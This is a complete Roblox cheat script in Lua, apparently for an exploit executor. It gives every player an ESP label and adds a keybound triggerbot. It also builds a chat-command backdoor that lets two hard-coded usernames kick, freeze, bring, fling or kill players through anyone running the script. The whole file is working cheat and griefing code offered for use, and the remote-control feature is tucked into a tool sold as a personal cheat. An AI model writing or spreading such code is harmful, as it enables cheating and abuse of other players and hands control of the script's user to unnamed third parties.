-- ðŸ”´ ULTIMATE Roblox Script: Fully Automated ESP + Triggerbot + VIP Commands

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TextChatService = (pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService") or nil)
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- Settings
local VIPUsers = {"misiuperc568","fasterpl11"}
local BringTargets, FrozenPlayers, TargetedPlayers, ESPObjects = {}, {}, {}, {}
local TriggerBot = {Enabled=false, Settings={Keybind=Enum.KeyCode.Q, Prediction=0.01, Blacklist={"Knife"}}, Connections={}, Cache={}}

for _,name in ipairs(TriggerBot.Settings.Blacklist) do TriggerBot.Cache[name:lower()]=true end

-- Utilities
local function IsVIP(name)
    name = name:lower()
    for _,v in ipairs(VIPUsers) do if name==v:lower() then return true end end
    return false
end

local function SafeChar(player) return player.Character or player.CharacterAdded:Wait() end

-- ESP Functions
local function AddESP(player)
    if ESPObjects[player] then return end
    local gui = Instance.new("BillboardGui")
    gui.Size=UDim2.new(0,100,0,20)
    gui.StudsOffset=Vector3.new(0,2,0)
    gui.AlwaysOnTop=true
    gui.Parent=game:GetService("CoreGui")

    local label=Instance.new("TextLabel")
    label.Size=UDim2.new(1,0,1,0)
    label.BackgroundTransparency=1
    label.TextColor3=Color3.fromRGB(255,0,0)
    label.TextStrokeTransparency=0.8
    label.TextStrokeColor3=Color3.new(0,0,0)
    label.TextScaled=true
    label.Font=Enum.Font.SourceSansBold
    label.Text=player.Name
    label.Parent=gui

    local conn
    conn=RunService.RenderStepped:Connect(function()
        local char = player.Character
        if char then
            local head = char:FindFirstChild("Head")
            if head then gui.Adornee=head end
        end
    end)
    ESPObjects[player]={Gui=gui, Conn=conn}
end

local function RemoveESP(player)
    local data=ESPObjects[player]
    if data then
        if data.Conn then data.Conn:Disconnect() end
        if data.Gui then data.Gui:Destroy() end
        ESPObjects[player]=nil
    end
end

-- Auto ESP for all players
for _,p in ipairs(Players:GetPlayers()) do if p~=LocalPlayer then AddESP(p) end end
Players.PlayerAdded:Connect(function(p) if p~=LocalPlayer then AddESP(p) end end)
Players.PlayerRemoving:Connect(RemoveESP)

-- VIP Functions
local function TeleportTo(playerName)
    local p=Players:FindFirstChild(playerName)
    if p and LocalPlayer.Character and p.Character then
        local myRoot=LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local targetRoot=p.Character:FindFirstChild("HumanoidRootPart")
        if myRoot and targetRoot then myRoot.CFrame=targetRoot.CFrame+Vector3.new(0,3,0) end
    end
end

local function FreezeAll(sender)
    for _,p in ipairs(Players:GetPlayers()) do
        if p.Name~=sender and not FrozenPlayers[p.Name] then
            local root=p.Character and p.Character:FindFirstChild("HumanoidRootPart")
            if root then root.Anchored=true; FrozenPlayers[p.Name]=true end
        end
    end
end

local function UnfreezeAll(sender)
    for name,_ in pairs(FrozenPlayers) do
        if name~=sender then
            local p=Players:FindFirstChild(name)
            if p then local root=p.Character and p.Character:FindFirstChild("HumanoidRootPart"); if root then root.Anchored=false end end
            FrozenPlayers[name]=nil
        end
    end
end

local function KillAll(sender)
    for _,p in ipairs(Players:GetPlayers()) do
        if p.Name~=sender then
            local hum=p.Character and p.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health=0 end
        end
    end
end

local function Fling(player)
    local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if root then
        local bv=Instance.new("BodyVelocity")
        bv.Velocity=Vector3.new(math.random(-1500,1500),800,math.random(-1500,1500))
        bv.MaxForce=Vector3.new(1e6,1e6,1e6)
        bv.P=1e5
        bv.Parent=root
        task.delay(0.3,function() bv:Destroy() end)
    end
end

-- Smooth Bring Loop
RunService.RenderStepped:Connect(function()
    for targetName,_ in pairs(BringTargets) do
        local target=Players:FindFirstChild(targetName)
        for _,vipName in ipairs(VIPUsers) do
            local vip=Players:FindFirstChild(vipName)
            if vip and target and vip.Character and target.Character and vip~=target then
                local vipRoot=vip.Character:FindFirstChild("HumanoidRootPart")
                local targetRoot=target.Character:FindFirstChild("HumanoidRootPart")
                if vipRoot and targetRoot then
                    local dir=(vipRoot.Position+Vector3.new(0,3,0)-targetRoot.Position)
                    targetRoot.CFrame=targetRoot.CFrame+dir*0.25
                end
            end
        end
    end
end)

-- Triggerbot
local function IsToolBlacklisted(tool) return tool and TriggerBot.Cache[tool.Name:lower()] end
local function IsValidTarget(player)
    if not player or player==LocalPlayer then return false end
    local char=player.Character
    if not char then return false end
    local be=char:FindFirstChild("BodyEffects")
    if be then local ko=be:FindFirstChild("K.O") or be:FindFirstChild("KO"); if ko and ko.Value then return false end end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.Health<=0 then return false end
    return true
end

local function GetTargetFromMouse()
    local target=Mouse.Target
    if not target then return nil end
    for _,p in ipairs(Players:GetPlayers()) do
        if p.Character and target:IsDescendantOf(p.Character) and IsValidTarget(p) then return p end
    end
end

local function GetTool()
    local char=LocalPlayer.Character
    if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then return tool end
    end
end

local function ExecuteTriggerBot()
    if not TriggerBot.Enabled then return end
    local target=GetTargetFromMouse()
    local tool=GetTool()
    if target and tool then
        if TriggerBot.Settings.Prediction>0 then task.wait(TriggerBot.Settings.Prediction) end
        tool:Activate()
    end
end

function TriggerBot:Toggle(state) self.Enabled=state~=nil and state or not self.Enabled end
TriggerBot.Connections.Input=UserInputService.InputBegan:Connect(function(input,gp) if gp then return end if input.UserInputType==Enum.UserInputType.Keyboard and input.KeyCode==TriggerBot.Settings.Keybind then TriggerBot:Toggle() end end)
TriggerBot.Connections.Render=RunService.RenderStepped:Connect(ExecuteTriggerBot)
getgenv().DisableTriggerBot=function() for _,c in pairs(TriggerBot.Connections) do c:Disconnect() end TriggerBot.Enabled=false end

-- Chat Command Handler
local function OnMessage(sender, msg)
    if not IsVIP(sender) then return end
    local args=msg:split(" ")
    local cmd=args[1]:lower()
    if cmd==".h" and args[2] then
        for _,p in ipairs(Players:GetPlayers()) do
            if (p.Name:lower()==args[2]:lower() or p.DisplayName:lower()==args[2]:lower()) and not TargetedPlayers[p.Name] then
                TargetedPlayers[p.Name]=true
                AddESP(p)
            end
        end
    elseif cmd==".j" then for name,_ in pairs(TargetedPlayers) do local p=Players:FindFirstChild(name); if p then RemoveESP(p) end TargetedPlayers[name]=nil end
    elseif cmd==".k" and LocalPlayer.Name:lower()~=sender:lower() then LocalPlayer:Kick("Kicked by VIP")
    elseif cmd==".g" then BringTargets[LocalPlayer.Name]=true
    elseif cmd==".s" then BringTargets[LocalPlayer.Name]=nil
    elseif cmd==".f" then FreezeAll(sender)
    elseif cmd==".u" then UnfreezeAll(sender)
    elseif cmd==".tp" and args[2] then TeleportTo(args[2])
    elseif cmd==".fling" then for _,p in ipairs(Players:GetPlayers()) do if p.Name~=sender then Fling(p) end end
    elseif cmd==".r" then KillAll(sender)
    end
end

local function processCommand(msg)
    local args=msg:split(" ")
    local cmd=args[1]:lower()
    OnMessage(LocalPlayer.Name, msg)
end

local function handleIncomingCommand(senderName, msg)
    OnMessage(senderName, msg)
end

if TextChatService then
    local commandsFolder = TextChatService:FindFirstChild("TextChatCommands")
    if not commandsFolder then
        commandsFolder = Instance.new("Folder")
        commandsFolder.Name = "TextChatCommands"
        commandsFolder.Parent = TextChatService
    end
    local cmdName = "VIPCommand"
    local cmd = commandsFolder:FindFirstChild(cmdName)
    if not cmd then
        cmd = Instance.new("TextChatCommand")
        cmd.Name = cmdName
        cmd.PrimaryAlias = "."
        cmd.SecondaryAlias = "/"
        cmd.Enabled = true
        cmd.Parent = commandsFolder
    end
    cmd.Triggered:Connect(function(a, b)
        local message
        local uid
        pcall(function() if a and a.Message then message = a.Message end end)
        pcall(function() if a and a.Text then message = a.Text end end)
        pcall(function() if b and type(b) == "string" then message = b end end)
        pcall(function() if a and a.UserId then uid = a.UserId end end)
        pcall(function() if a and a.TextSource and a.TextSource.UserId then uid = a.TextSource.UserId end end)
        if not message and a then message = tostring(a) end

        local senderName = nil
        if uid then
            local pl = Players:GetPlayerByUserId(uid)
            if pl then senderName = pl.Name end
        end

        if senderName and senderName ~= LocalPlayer.Name then
            pcall(function() handleIncomingCommand(senderName, message) end)
        end

        if uid and uid == LocalPlayer.UserId then processCommand(message) end
    end)
end

pcall(function() LocalPlayer.Chatted:Connect(function(msg) processCommand(msg) end) end)

for _,pl in ipairs(Players:GetPlayers()) do
    if pl ~= LocalPlayer then
        pcall(function()
            pl.Chatted:Connect(function(txt) handleIncomingCommand(pl.Name, txt) end)
        end)
    end
end
Players.PlayerAdded:Connect(function(pl)
    if pl ~= LocalPlayer then
        pcall(function()
            pl.Chatted:Connect(function(txt) handleIncomingCommand(pl.Name, txt) end)
        end)
    end
end)

StarterGui:SetCore("ChatMakeSystemMessage",{Text="[Ultimate Script] Loaded: ESP, Triggerbot (Q), VIP Commands"})
